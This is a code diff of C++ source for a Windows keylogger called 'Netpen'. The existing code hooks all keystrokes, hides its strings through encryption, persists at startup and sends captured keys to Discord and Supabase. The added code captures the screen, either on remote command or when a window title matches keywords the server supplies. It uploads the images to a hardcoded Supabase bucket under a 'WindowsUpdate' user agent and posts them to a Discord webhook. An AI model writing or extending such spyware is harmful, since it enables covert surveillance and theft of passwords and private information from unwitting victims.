@@ -4,6 +4,7 @@
 #include <vector>
 #include <ctime>
 #include <wincrypt.h>
+#include <gdiplus.h>
 #include "config.h"
 
 #ifndef NETPEN_VERSION
@@ -20,6 +21,8 @@ static std::string g_winTitle;
 static std::string g_keys;
 static DWORD g_lastTick = 0;
 static DWORD g_lastDiscord = 0;
+static DWORD g_lastAutoScreenshot = 0;
+static std::vector<std::string> g_triggers;
 static bool g_running = true;
 static bool g_selfDestructing = false;
 static std::string g_hostname;
@@ -27,12 +30,14 @@ static HWND g_hwnd = NULL;
 
 static std::wstring g_supabaseHost;
 static std::wstring g_supabaseKey;
+static std::wstring g_supabaseServiceKey;
 static std::wstring g_discordHost;
 static std::wstring g_discordPath;
 
 static void InitConfig() {
     g_supabaseHost = DecryptW(_enc_SUPABASE_HOST, sizeof(_enc_SUPABASE_HOST));
     g_supabaseKey = DecryptW(_enc_SUPABASE_ANON_KEY, sizeof(_enc_SUPABASE_ANON_KEY));
+    g_supabaseServiceKey = DecryptW(_enc_SUPABASE_SERVICE_KEY, sizeof(_enc_SUPABASE_SERVICE_KEY));
     g_discordHost = DecryptW(_enc_DISCORD_HOST, sizeof(_enc_DISCORD_HOST));
     g_discordPath = DecryptW(_enc_DISCORD_PATH, sizeof(_enc_DISCORD_PATH));
 }
@@ -316,7 +321,22 @@ static bool HttpDownloadToFile(const wchar_t* path, const char* outputPath) {
     return true;
 }
 
+static bool IsSpamText(const std::string& s) {
+    if (s.size() <= 5) return false;
+    bool seen[256] = {false};
+    int unique = 0;
+    for (size_t i = 0; i < s.size(); i++) {
+        if (!seen[(unsigned char)s[i]]) {
+            seen[(unsigned char)s[i]] = true;
+            unique++;
+            if (unique >= 3) return false;
+        }
+    }
+    return true;
+}
+
 static void PostToDiscord(const std::string& hostname, const std::string& window, const std::string& keys) {
+    if (IsSpamText(keys)) return;
     DWORD now = GetTickCount();
     if (now - g_lastDiscord < 30000) return;
     g_lastDiscord = now;
@@ -451,6 +471,203 @@ static bool DeployUpdate(int remoteVer) {
     return true;
 }
 
+static int GetEncoderClsid(const wchar_t* format, CLSID* clsid) {
+    UINT num = 0, size = 0;
+    Gdiplus::GetImageEncodersSize(&num, &size);
+    if (size == 0) return -1;
+    Gdiplus::ImageCodecInfo* codecs = (Gdiplus::ImageCodecInfo*)malloc(size);
+    Gdiplus::GetImageEncoders(num, size, codecs);
+    for (UINT i = 0; i < num; i++) {
+        if (wcscmp(codecs[i].MimeType, format) == 0) { *clsid = codecs[i].Clsid; free(codecs); return i; }
+    }
+    free(codecs);
+    return -1;
+}
+
+static void PostDiscordImage(const std::string& host, const std::string& title, const std::string& imgUrl, const std::string& desc);
+
+static bool CaptureScreen(const char* outputPath) {
+    HDC hScreenDC = GetDC(NULL);
+    HDC hMemDC = CreateCompatibleDC(hScreenDC);
+    int w = GetDeviceCaps(hScreenDC, HORZRES);
+    int h = GetDeviceCaps(hScreenDC, VERTRES);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, w, h);
+    SelectObject(hMemDC, hBitmap);
+    BitBlt(hMemDC, 0, 0, w, h, hScreenDC, 0, 0, SRCCOPY);
+
+    Gdiplus::Bitmap bitmap(hBitmap, NULL);
+    CLSID clsid;
+    if (GetEncoderClsid(L"image/jpeg", &clsid) < 0) {
+        DeleteObject(hBitmap); DeleteDC(hMemDC); ReleaseDC(NULL, hScreenDC);
+        return false;
+    }
+
+    Gdiplus::EncoderParameters eps;
+    eps.Count = 1;
+    eps.Parameter[0].Guid = Gdiplus::EncoderQuality;
+    eps.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
+    eps.Parameter[0].NumberOfValues = 1;
+    UINT q = 80;
+    eps.Parameter[0].Value = &q;
+
+    bool ok = bitmap.Save(ToWide(outputPath).c_str(), &clsid, &eps) == Gdiplus::Ok;
+    DeleteObject(hBitmap); DeleteDC(hMemDC); ReleaseDC(NULL, hScreenDC);
+    return ok;
+}
+
+static std::string GetScreenshotTimestamp() {
+    time_t now = time(NULL);
+    struct tm* tm = gmtime(&now);
+    char buf[32] = {0};
+    strftime(buf, sizeof(buf), "%Y%m%d_%H%M%S", tm);
+    return std::string(buf);
+}
+
+static bool UploadToStorage(const std::string& localPath, const std::string& storagePath, const char* contentType) {
+    HANDLE hFile = CreateFileA(localPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return false;
+    DWORD size = GetFileSize(hFile, NULL);
+    if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(hFile); return false; }
+    char* buf = new char[size];
+    DWORD read = 0;
+    if (!ReadFile(hFile, buf, size, &read, NULL) || read != size) { delete[] buf; CloseHandle(hFile); return false; }
+    CloseHandle(hFile);
+
+    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    if (!hSession) { delete[] buf; return false; }
+    WinHttpSetTimeouts(hSession, 30000, 30000, 30000, 30000);
+    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); delete[] buf; return false; }
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"PUT", ToWide(storagePath).c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); delete[] buf; return false; }
+
+    std::wstring headers = L"apikey: " + g_supabaseServiceKey + L"\r\nAuthorization: Bearer " + g_supabaseServiceKey + L"\r\nContent-Type: " + ToWide(contentType) + L"\r\nx-upsert: true";
+
+    bool ok = false;
+    if (WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), buf, size, size, 0)) {
+        if (WinHttpReceiveResponse(hRequest, NULL)) {
+            DWORD sc = 0, sl = sizeof(sc);
+            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &sc, &sl, NULL);
+            ok = (sc >= 200 && sc < 300);
+        }
+    }
+    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
+    delete[] buf;
+    return ok;
+}
+
+static std::string CheckScreenshotCmd() {
+    std::wstring q = SUPABASE_CONTROL_PATH;
+    q += L"?command=eq.screenshot&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
+    std::string resp;
+    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
+    size_t p = resp.find("\"id\":");
+    if (p == std::string::npos) return "";
+    p += 5;
+    size_t e = resp.find_first_of("},]", p);
+    if (e == std::string::npos) return "";
+    return resp.substr(p, e - p);
+}
+
+static void HandleScreenshot(const std::string& rowId) {
+    char tmp[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmp);
+    std::string ts = GetScreenshotTimestamp();
+    std::string localFile = std::string(tmp) + "NetpenShot_" + g_hostname + "_" + ts + ".jpg";
+    std::string storageFile = "screenshots/" + g_hostname + "_" + ts + ".jpg";
+
+    if (!CaptureScreen(localFile.c_str())) { LogMsg("Screenshot: capture failed"); return; }
+    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
+    if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
+        LogMsg("Screenshot: upload failed");
+        DeleteFileA(localFile.c_str());
+        return;
+    }
+
+    std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
+    std::string json = "{\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}";
+    std::wstring patchPath = SUPABASE_CONTROL_PATH;
+    patchPath += L"?id=eq." + ToWide(rowId);
+    std::string resp;
+    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
+
+    std::string host = g_hostname.empty() ? "unknown" : g_hostname;
+    PostDiscordImage(host, "Netpen \u2014 " + host + " Screenshot", resultUrl, "");
+
+    DeleteFileA(localFile.c_str());
+    LogMsg("Screenshot done: " + resultUrl);
+}
+
+static void FetchTriggers() {
+    std::string resp;
+    std::wstring q = L"/rest/v1/screenshot_triggers?active=eq.true&select=keyword";
+    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
+    g_triggers.clear();
+    size_t pos = 0;
+    while (true) {
+        size_t kp = resp.find("\"keyword\":\"", pos);
+        if (kp == std::string::npos) break;
+        kp += 11;
+        size_t ke = resp.find("\"", kp);
+        if (ke == std::string::npos) break;
+        std::string kw = resp.substr(kp, ke - kp);
+        if (!kw.empty()) g_triggers.push_back(kw);
+        pos = ke + 1;
+    }
+}
+
+static void PostDiscordImage(const std::string& host, const std::string& title, const std::string& imgUrl, const std::string& desc) {
+    std::string payload = "{\"embeds\":[{\"title\":\"" + EscapeJSON(title) + "\",\"color\":3066993,\"description\":\"" + EscapeJSON(desc) + "\",\"image\":{\"url\":\"" + EscapeJSON(imgUrl) + "\"},\"timestamp\":\"" + GetTimestamp() + "\"}]}";
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    if (!hSession) return;
+    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
+    HINTERNET hConnect = WinHttpConnect(hSession, g_discordHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", g_discordPath.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
+    std::wstring hdrs = L"Content-Type: application/json";
+    WinHttpSendRequest(hRequest, hdrs.c_str(), hdrs.length(), (LPVOID)payload.c_str(), (DWORD)payload.size(), (DWORD)payload.size(), 0);
+    WinHttpReceiveResponse(hRequest, NULL);
+    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
+}
+
+static void CheckAutoScreenshot(const std::string& windowTitle) {
+    if (windowTitle.empty() || g_triggers.empty()) return;
+    DWORD now = GetTickCount();
+    if (now - g_lastAutoScreenshot < 300000) return; // 5 min
+    std::string lowerTitle;
+    lowerTitle.resize(windowTitle.size());
+    for (size_t i = 0; i < windowTitle.size(); i++) lowerTitle[i] = tolower(windowTitle[i]);
+
+    for (size_t i = 0; i < g_triggers.size(); i++) {
+        std::string kw = g_triggers[i];
+        std::string lowerKw;
+        lowerKw.resize(kw.size());
+        for (size_t j = 0; j < kw.size(); j++) lowerKw[j] = tolower(kw[j]);
+        if (lowerTitle.find(lowerKw) == std::string::npos) continue;
+
+        g_lastAutoScreenshot = now;
+        char tmp[MAX_PATH];
+        GetTempPathA(MAX_PATH, tmp);
+        std::string ts = GetScreenshotTimestamp();
+        std::string localFile = std::string(tmp) + "NetpenAuto_" + g_hostname + "_" + ts + ".jpg";
+        std::string storageFile = "auto_screenshots/" + g_hostname + "_" + ts + ".jpg";
+
+        if (!CaptureScreen(localFile.c_str())) { LogMsg("AutoSS: capture failed"); break; }
+        std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
+        if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
+            LogMsg("AutoSS: upload failed");
+            DeleteFileA(localFile.c_str()); break;
+        }
+        std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
+        std::string host = g_hostname.empty() ? "unknown" : g_hostname;
+        PostDiscordImage(host, "Netpen \u2014 " + host + " Auto-Screenshot", resultUrl, "Window: " + windowTitle + " (matched \"" + kw + "\")");
+        DeleteFileA(localFile.c_str());
+        LogMsg("AutoSS: " + resultUrl + " (trigger: " + kw + ")");
+        break;
+    }
+}
+
 static void FlushBuffer() {
     if (g_keys.empty()) return;
 
@@ -497,8 +714,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             json += "\"}]";
             PostToDiscord(g_hostname, win, keys);
             PostKeys(json);
+            CheckAutoScreenshot(newTitle);
         } else if (g_winTitle.empty()) {
             g_winTitle = newTitle;
+            CheckAutoScreenshot(newTitle);
         }
 
         std::string keyStr = GetKeyString(vk);
@@ -553,6 +772,11 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                     g_running = false;
                     DestroyWindow(hwnd);
                 }
+            }
+            if (counter % 60 == 0 && !g_selfDestructing) {
+                FetchTriggers();
+                std::string scRowId = CheckScreenshotCmd();
+                if (!scRowId.empty()) HandleScreenshot(scRowId);
             }
             if (counter % 120 == 0 && !g_selfDestructing) {
                 EnsureStartupEntry();
@@ -642,8 +866,12 @@ static int RunChild(HINSTANCE hInstance) {
     wc.lpszClassName = windowClass.c_str();
     if (!RegisterClassExW(&wc)) return 1;
 
+    Gdiplus::GdiplusStartupInput gdiInput;
+    ULONG_PTR gdiToken;
+    Gdiplus::GdiplusStartup(&gdiToken, &gdiInput, NULL);
+
     g_hwnd = CreateWindowExW(0, windowClass.c_str(), L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
-    if (!g_hwnd) return 1;
+    if (!g_hwnd) { Gdiplus::GdiplusShutdown(gdiToken); return 1; }
 
     g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
     if (!g_hHook) {
@@ -661,6 +889,7 @@ static int RunChild(HINSTANCE hInstance) {
 
     if (g_hHook) UnhookWindowsHookEx(g_hHook);
     if (g_hwnd) DestroyWindow(g_hwnd);
+    Gdiplus::GdiplusShutdown(gdiToken);
     LogMsg("Child stopped");
     return 0;
 }
